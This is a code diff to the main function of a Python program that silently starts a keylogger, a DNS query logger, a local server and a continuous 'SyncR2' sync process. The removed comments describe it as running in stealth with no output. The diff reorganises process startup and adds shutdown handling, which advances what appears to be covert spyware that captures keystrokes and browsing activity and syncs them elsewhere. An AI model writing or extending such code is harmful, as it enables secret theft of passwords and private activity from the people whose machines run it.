@@ -47,27 +47,37 @@ def create_processes(choice):
 
 
 def main():
-    # Prevent multiple instances (stealth: no output)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.bind(("", 9903))
     except socket.error:
         sys.exit()
 
+    dir_path()
+    processes = [
+        multiprocessing.Process(target=server, name="LocalServer"),
+        multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
+        multiprocessing.Process(target=key_logger, name="KeyLogger"),
+        multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+    ]
     try:
-        dir_path()
-        # Always start all loggers and sync in stealth mode
-        processes = [
-            multiprocessing.Process(target=server, name="LocalServer"),
-            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
-            multiprocessing.Process(target=key_logger, name="KeyLogger"),
-            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
-        ]
         for p in processes:
             p.start()
         for p in processes:
             p.join()
+    except (KeyboardInterrupt, SystemExit):
+        for p in processes:
+            if p.is_alive():
+                p.terminate()
+        for p in processes:
+            p.join()
+        sys.exit(0)
     except Exception:
+        for p in processes:
+            if p.is_alive():
+                p.terminate()
+        for p in processes:
+            p.join()
         sys.exit(1)
 
 
